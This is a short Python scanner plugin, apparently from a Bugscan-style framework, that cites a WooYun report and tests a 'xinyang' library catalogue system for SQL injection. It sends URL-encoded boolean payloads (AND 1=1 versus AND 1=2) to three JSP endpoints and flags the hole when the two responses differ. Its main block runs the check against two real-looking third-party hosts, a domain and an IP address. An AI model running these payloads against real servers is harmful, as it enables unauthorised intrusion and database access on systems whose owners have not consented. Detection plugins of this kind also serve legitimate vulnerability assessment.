#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-099335

def assign(service, arg):
    if service == "xinyang":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'opac/index_hotsc.jsp?flh=',
        '/opac/index_hotll.jsp?flh=',
        '/opac/index_hotpj.jsp?flh=',
        ]
    getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
    getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
    for payload in payloads:
        url1 = arg + payload +getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)  
        if code1 == 200 and code2 ==200 and  'cursor:hand' in res1 and 'cursor:hand' not in res2 :
            security_hole(arg+payload+'   :found sql Injection')


if __name__ == '__main__':
    from dummy import *
    audit(assign('xinyang','http://tsjs.sdwm.cn:8000/')[1])
    audit(assign('xinyang','http://59.51.114.198:8088/')[1])